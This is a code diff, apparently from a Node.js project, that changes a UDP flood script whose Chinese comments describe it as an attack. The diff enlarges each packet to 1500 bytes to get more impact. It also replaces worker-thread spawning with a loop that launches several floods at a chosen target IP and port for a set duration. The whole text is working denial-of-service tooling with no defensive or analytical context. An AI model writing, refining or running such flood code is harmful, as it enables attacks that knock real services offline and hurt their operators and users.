@@ -1,10 +1,10 @@
 const dgram = require('dgram');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 
 // 向目标发送 UDP 包的核心函数
 const floodUDP = (targetIP, targetPort, duration) => {
   const client = dgram.createSocket('udp4');
-  const message = Buffer.alloc(1024, 'A'); 
+  const message = Buffer.alloc(1500, 'A');  // 增加数据包大小 (1500字节，接近最大 MTU 大小)
+
   const sendFlood = () => {
     client.send(message, 0, message.length, targetPort, targetIP, (err) => {
       if (err) console.error('Send error:', err);
@@ -22,18 +22,11 @@ const floodUDP = (targetIP, targetPort, duration) => {
   }, duration * 1000);
 };
 
-// 生成多个线程来执行攻击
+// 处理并启动多个攻击线程
 const startFlood = (targetIP, targetPort, duration, threads) => {
-  if (isMainThread) {
-    // 主线程创建多个工作线程
-    for (let i = 0; i < threads; i++) {
-      new Worker(__filename, {
-        workerData: { targetIP, targetPort, duration }
-      });
-    }
-  } else {
-    // 在工作线程中执行 UDP Flood
-    floodUDP(workerData.targetIP, workerData.targetPort, workerData.duration);
+  for (let i = 0; i < threads; i++) {
+    // 每个线程启动独立的 UDP flood
+    floodUDP(targetIP, targetPort, duration);
   }
 };
 
